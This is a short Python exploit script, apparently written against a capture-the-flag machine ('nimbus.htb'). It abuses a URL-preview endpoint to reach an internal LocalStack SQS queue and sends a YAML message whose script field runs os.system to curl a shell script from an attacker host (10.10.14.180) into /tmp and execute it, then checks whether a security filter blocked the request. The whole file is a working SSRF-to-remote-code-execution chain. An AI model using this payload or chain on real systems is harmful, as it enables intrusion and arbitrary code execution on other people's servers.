import requests

LOCALSTACK = "172.18.0.2:4566"
ACCOUNT = "<REDACTED_ACCOUNT_ID>"
QUEUE = "nimbus-jobs"

bootstrap = '__import__("os").system("curl 10.10.14.180:8003/r.sh -o /tmp/r.sh; sh /tmp/r.sh")'
yaml_body = "script: '" + bootstrap + "'"
print("YAML message body:", yaml_body)

url = f"http://{LOCALSTACK}/{ACCOUNT}/{QUEUE}?Action=SendMessage&Version=2012-11-05&MessageBody={yaml_body}&x=.yaml"
r = requests.post("http://nimbus.htb/jobs/preview", data={"url": url}, timeout=20)
verdict = "BLOCKED" if "Security policy" in r.text else ("FETCHED" if "Fetched:" in r.text else "OTHER")
print("verdict:", verdict)
open("http/E28_sqs_rce_response.txt", "w").write(r.text)
